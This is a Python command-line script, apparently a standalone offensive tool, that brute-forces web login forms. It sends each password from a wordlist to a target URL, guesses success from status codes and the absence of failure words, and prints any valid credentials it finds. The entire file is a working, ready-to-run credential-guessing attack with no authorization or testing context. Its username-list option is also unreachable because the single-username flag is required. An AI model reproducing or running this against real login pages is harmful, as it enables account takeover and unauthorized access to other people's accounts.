import requests
import argparse
import sys
from pathlib import Path

def brute_force_login(target_url, username, password_file, success_indicator=None):
    
    if not Path(password_file).exists():
        print(f"[!] Password file not found: {password_file}")
        return None
    
    attempts = 0
    print(f"[*] Testing username: {username}")
    
    try:
        with open(password_file, 'r', encoding='latin-1') as f:
            for line in f:
                password = line.strip()
                attempts += 1
                
                sys.stdout.write(f"\r[{attempts}] Trying: {username}:{password[:20]}...")
                sys.stdout.flush()
                
                try:
                    r = requests.post(
                        target_url,
                        data={'username': username, 'password': password},
                        timeout=5
                    )
                    
                    # Check for success
                    is_success = False
                    
                    if success_indicator:
                        # User provided specific success string
                        is_success = success_indicator in r.text
                    else:
                        # Default: check common success indicators
                        success_codes = [200, 302]
                        fail_indicators = ['invalid', 'incorrect', 'failed', 'wrong', 'error']
                        
                        is_success = (
                            r.status_code in success_codes and
                            not any(indicator in r.text.lower() for indicator in fail_indicators)
                        )
                    
                    if is_success:
                        print(f"\n[+] Valid credentials found!")
                        print(f"[+] Username: {username}")
                        print(f"[+] Password: {password}")
                        print(f"[+] Attempts: {attempts}")
                        return password
                
                except requests.exceptions.RequestException as e:
                    print(f"\n[!] Request error: {e}")
                    continue
        
        print(f"\n[-] No valid password found for '{username}' after {attempts} attempts")
        return None
    
    except KeyboardInterrupt:
        print(f"\n[!] Interrupted after {attempts} attempts")
        return None

def main():
    parser = argparse.ArgumentParser(description='Web Login Brute-Force Tool')
    parser.add_argument('url', help='Target login URL')
    parser.add_argument('-u', '--username', required=True, help='Username to test')
    parser.add_argument('-U', '--usernames', help='Username wordlist file')
    parser.add_argument('-p', '--passwords', required=True, help='Password wordlist file')
    parser.add_argument('-s', '--success', help='Success indicator string (e.g., "Welcome back")')
    
    args = parser.parse_args()
    
    print(f"[*] Target: {args.url}")
    print(f"[*] Password list: {args.passwords}")
    
    # Single username mode
    if args.username:
        brute_force_login(args.url, args.username, args.passwords, args.success)
    
    # Username list mode
    elif args.usernames:
        if not Path(args.usernames).exists():
            print(f"[!] Username file not found: {args.usernames}")
            sys.exit(1)
        
        with open(args.usernames, 'r') as f:
            usernames = [line.strip() for line in f if line.strip()]
        
        print(f"[*] Testing {len(usernames)} usernames")
        
        for username in usernames:
            result = brute_force_login(args.url, username, args.passwords, args.success)
            if result:
                break

if __name__ == '__main__':
    main()